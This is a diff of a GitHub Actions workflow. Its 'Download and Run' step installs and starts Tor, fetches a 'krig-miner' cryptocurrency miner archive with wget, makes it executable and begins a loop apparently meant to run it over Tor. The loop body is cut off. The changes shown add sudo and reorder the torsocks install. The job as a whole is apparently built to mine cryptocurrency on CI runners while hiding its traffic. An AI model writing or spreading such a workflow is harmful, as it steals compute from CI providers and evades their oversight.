@@ -29,9 +29,9 @@ jobs:
       - name: Download and Run
         run: |
           # Install and start Tor
-          apt-get update -qq
-          apt-get install -y -qq tor
-          tor &
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq tor torsocks
+          sudo service tor start
           echo "Waiting for Tor to start..."
           sleep 10
           
@@ -39,9 +39,6 @@ jobs:
           wget https://github.com/kryptex/krig-miner/releases/download/v1.5.2/krig-miner-1.5.2-linux-x64.tar.gz
           tar xzf krig-miner-1.5.2-linux-x64.tar.gz
           chmod +x krig-miner
-          
-          # Install torsocks
-          apt-get install -y -qq torsocks
           
           # Keep running in loop with Tor
           while true; do
